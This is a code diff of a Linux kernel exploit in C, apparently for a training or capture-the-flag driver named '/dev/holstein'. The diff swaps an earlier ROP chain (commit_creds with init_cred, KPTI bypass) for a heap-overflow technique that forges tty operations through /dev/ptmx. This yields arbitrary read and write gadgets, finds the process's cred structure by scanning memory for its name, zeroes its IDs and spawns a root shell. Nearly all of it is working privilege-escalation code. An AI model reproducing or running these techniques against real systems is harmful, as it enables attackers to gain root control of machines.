@@ -4,6 +4,7 @@
 #include <string.h>
 #include <unistd.h>
 #include <stdint.h>
+#include <sys/prctl.h>
 #ifndef HEXDUMP_COLS
 #define HEXDUMP_COLS 16
 #endif
@@ -81,41 +82,73 @@ static void save_state() {
         : "memory");
 }
 
-#define init_cred 0xffffffff824505e0 - 0xffffffff81000000
-#define commit_creds  0xffffffff8108cd90 - 0xffffffff81000000
-#define pop_rdi_ret 0xffffffff811719c0 - 0xffffffff81000000
-#define bypass_kpti 0xffffffff81c00e06 - 0xffffffff81000000
+#define AAR_GADGET 0xffffffff816ae679 - 0xffffffff81000000
+#define AAW_GADGET 0xffffffff818d9ef8 - 0xffffffff81000000
+
+int fd;
+int target_fd;
+char buf[0x500];
+uint64_t kernel_base;
+uint64_t gbuf_addr;
+
+void AAW(uint64_t* dst, unsigned int val){
+	uint64_t* fake_ops = buf;
+	fake_ops[12] = kernel_base + AAW_GADGET;
+	*(uint64_t*)(buf + 0x418) = gbuf_addr;
+	write(fd, buf, 0x500);
+	ioctl(target_fd, val, dst);
+}
+
+unsigned int AAR(uint64_t* src){
+	uint64_t* fake_ops = buf;
+	fake_ops[12] = kernel_base + AAR_GADGET;
+	*(uint64_t*)(buf + 0x418) = gbuf_addr;
+	write(fd, buf, 0x500);
+	return ioctl(target_fd, 0, src);
+}
+
 
 int main() {
-    int fd;
-    char buf[0x500];
-
     save_state();
+	if (prctl(PR_SET_NAME, "KUICS" ) != 0 ) 
+		exit(0);
 
-    fd = open("/dev/holstein", O_RDWR);
-    is_error(fd == -1, "open() failed");
-
-    read(fd, buf, 0x500);
-
-	//ROP chain
-	uint64_t* rop = (uint64_t*)(buf + 0x400);
-	uint64_t kernel_text = rop[0];
-	uint64_t kernel_base = kernel_text - (uint64_t)0x1f0c10;
+	fd = open("/dev/holstein", O_RDWR);
+	target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+	read(fd, buf, 0x500);
+	hexdump(buf, 0x500);
+	uint64_t kernel_text = *(uint64_t*)(buf + 0x418);
+	kernel_base = kernel_text - 0x0000000001072460;
 	printf("[-] kernel base: %p\n", kernel_base);
+	gbuf_addr = *(uint64_t*)(buf + 0x438) - 0x438;
+	printf("[-] gbuf_addr: %p\n", gbuf_addr);
+	gets();
+	uint64_t comm_addr = 0x0;
+	for(uint64_t addr = gbuf_addr - 0x400000;;addr += 8){
+		if(!(addr&0xffff)){
+			printf("[-] searching: %p\n", addr);
+		}
+		//KUIC...
+		if(AAR(addr) == 0x4349554b){
+			printf("[?] hit: %p\n", addr);
+			comm_addr = addr;
+			break;
+		}
+	}
 
-	rop[0] = pop_rdi_ret + kernel_base;
-	rop[1] = init_cred + kernel_base;
-	rop[2] = commit_creds + kernel_base;
-	rop[3] = bypass_kpti + kernel_base;
-	rop[4] = 0;
-	rop[5] = 0;
-	rop[6] = win;
-	rop[7] = user_cs;
-	rop[8] = user_rflags;
-	rop[9] = user_rsp;
-	rop[10] = user_ss;
+	uint64_t leak1 = (uint64_t)AAR(comm_addr - 0x10);
+	printf("[-] leak1: %p\n", leak1);
+	uint64_t leak2 = (uint64_t)AAR(comm_addr - 0x10 + 4);
+	printf("[-] leak2: %p\n", leak2);
+	uint64_t cred_addr = (leak2 << 32)|(leak1);
+	printf("[-] cred addr: %p\n", cred_addr);
 
-	write(fd, buf, 0x500);
+	for(int i=0; i< 8; i++){
+		AAW(cred_addr+4+i*4, 0x0);
+	}
+	system("/bin/sh");
+	//int target_fd = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+	//ioctl(target_fd, 0x4141414141414141, 0x4242424242424242);
 
     return 0;
 }
